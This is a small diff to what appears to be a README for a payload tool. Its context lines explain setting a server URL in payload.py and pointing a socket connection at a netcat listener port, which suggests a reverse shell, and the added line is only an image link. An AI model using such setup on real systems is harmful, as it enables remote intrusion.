@@ -41,3 +41,5 @@ Key points:
 1. SERVER_URL = "http://192.168.88.105:2020" in payload.py replace the local ip address with your local ip address.
 
 2. s.connect(("IP", "PORT")) Replace ip with your local ip address and port with netcat port.
+
+![Example Logo](public/example.png)
